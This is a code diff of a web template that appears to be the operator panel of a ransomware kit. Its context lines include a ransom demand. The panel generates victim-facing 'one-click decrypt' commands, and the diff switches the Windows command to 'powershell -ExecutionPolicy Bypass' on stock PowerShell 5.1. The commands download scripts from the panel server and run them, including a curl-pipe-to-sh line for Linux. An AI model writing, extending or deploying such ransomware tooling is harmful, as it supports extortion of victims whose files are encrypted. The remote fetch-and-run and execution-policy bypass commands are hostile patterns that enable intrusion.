@@ -211,9 +211,9 @@ Contact us to obtain the private key and restore your files.</textarea>
 <div class="dt-step"><span>2</span>点击命令框右上角「复制」按钮，粘贴到终端运行</div>
 <div class="dt-note"><i class="fas fa-shield-alt"></i> 自动下载私钥+解密器、执行解密、清理临时文件</div>
 <pre class="dt-code">:: 纯 PowerShell 实现，无需编译 exe
-:: 要求 PowerShell 7+   (未装可执行: winget install Microsoft.PowerShell)
+:: 要求 PowerShell 5.1+（Windows 10/11、Server 2016+ 系统自带，无需安装任何东西）
 curl.exe -sL {{ request.url_root }}payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1
-pwsh -File jasmin_unlock.ps1 -Server {{ request.url_root }} -K "{{ aes_key }}"
+powershell -ExecutionPolicy Bypass -File jasmin_unlock.ps1 -Server {{ request.url_root }} -K "{{ aes_key }}"
 :: -Paths 换成要解密的目录；不写则解密当前目录</pre>
 </div>
 <div class="dt-content" id="dt-linux" style="display:none">
@@ -433,7 +433,7 @@ function showDecrypt(btn){
   if(isLinux){
     pre.textContent='# '+ip+' 一键解密 — 纯 openssl 零依赖\n# 不写目录 = 解密全部加密文件\ncurl -sL '+srv+'/payloads/jasmin_unlock.sh | sh -s '+srv+' "'+k+'"';
   }else{
-    pre.textContent=':: '+ip+' 一键解密 — 纯 PowerShell，无需编译 exe\n:: 要求 PowerShell 7+   (winget install Microsoft.PowerShell)\ncurl.exe -sL '+srv+'/payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1\npwsh -File jasmin_unlock.ps1 -Server '+srv+' -K "'+k+'" -Paths C:\path\to\decrypt';
+    pre.textContent=':: '+ip+' 一键解密 — 纯 PowerShell，无需编译 exe\n:: 要求 PowerShell 5.1+（系统自带）\ncurl.exe -sL '+srv+'/payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1\npowershell -ExecutionPolicy Bypass -File jasmin_unlock.ps1 -Server '+srv+' -K "'+k+'" -Paths C:\path\to\decrypt';
   }
   td.appendChild(pre);
   nr.appendChild(td);row.after(nr);_decOpen=nr;
